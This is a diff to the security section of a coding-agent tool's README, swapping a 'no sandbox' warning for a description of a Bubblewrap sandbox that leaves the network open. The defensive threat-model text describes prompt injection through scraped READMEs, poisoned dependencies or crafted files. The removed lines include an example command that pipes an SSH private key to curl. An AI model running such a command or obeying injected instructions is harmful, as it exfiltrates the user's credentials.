@@ -71,22 +71,24 @@ machine that holds secrets you care about.** It is a working demo
 of the coding-agent shape, *not* a hardened tool. The threat
 model has glaring holes:
 
-- **No sandbox.** The `bash` tool runs commands as your user,
-  with your environment, your `$HOME`, your `~/.ssh`, your shell
-  history, your browser cookies, your cloud CLI credentials —
-  all reachable. An LLM that's been prompt-injected (e.g. by a
-  malicious README it scraped, a poisoned dependency, or a
-  crafted file in the repo) can ask to run
-  `cat ~/.ssh/id_ed25519 | curl -X POST ...` and the only thing
-  standing between that and exfiltration is *you* reading the
-  confirmation prompt carefully. The workspace lock applies to
-  pikuri's own `read`/`write`/`edit`/`grep`/`glob`/`file_list` tools — it
-  does **not** apply to `bash`, which can `cat`, `cp`, `scp`,
-  `curl` anything the OS lets your user touch.
-- **`--yolo` auto-approves everything.** That flag exists for
-  use *inside* a disposable container or VM. Running `--yolo`
-  on your laptop is equivalent to handing the model a root
-  shell. Don't.
+- **The sandbox walls off your home, not this project or the
+  network.** `bash` runs inside Bubblewrap by default: it sees the
+  workspace, the folders you add with `--readable` / `--writable`
+  (readable ones, your toolchain caches among them, as throwaway
+  overlays) and a small OS baseline, so `~/.ssh`, `~/.aws` and your
+  other projects don't exist in there. It gets only the environment
+  variables a build needs; the banner lists what it withholds. The
+  network stays open, though: an LLM that's been prompt-injected
+  (by a malicious README it scraped, a poisoned dependency, a
+  crafted file in the repo) can still ask to `curl` this project's
+  `.env` to a stranger, and *you* reading the confirmation prompt
+  is what stands in the way. pikuri's own file tools are held to
+  the same workspace. `--no-sandbox` drops the wall, and `bash`
+  then reaches everything your user can.
+- **`--yolo` turns every wall off.** No sandbox, no prompts, and
+  the file tools open to the whole disk. That flag exists for use
+  *inside* a disposable container or VM; on your laptop it hands
+  the model your user account. Don't.
 - **Network tools fetch arbitrary URLs.** `web_search`,
   `web_scrape`, and `fetch` are happy to pull whatever the
   model asks for, and the content of those pages then becomes
@@ -96,12 +98,12 @@ model has glaring holes:
   `bash` command it runs; there's no separate record beyond
   your scrollback.
 
-In short: run it inside a Docker container, a dev container, a
-VM, a fresh user account — anywhere you'd be fine with a stranger
-having a shell. The sandboxing story is a known gap and tracked
-as future work (see [`design/ideas/security-open-questions.md`](https://github.com/mvysny/pikuri/blob/master/design/ideas/security-open-questions.md)); until it lands,
-**assume the agent can do anything your user can do**, and
-approve prompts on that basis.
+In short: the sandbox keeps `bash` out of the rest of your home,
+not out of this project or off the network. Run it attended, on a
+repo you trust, and read each prompt. For `--yolo`, unattended
+runs or a repo you don't trust, run the whole of `pikuri-code`
+inside a VM — anywhere you'd be fine with a stranger having a
+shell ([`SECURITY.md`](../SECURITY.md)).
 
 ## Further reading
 
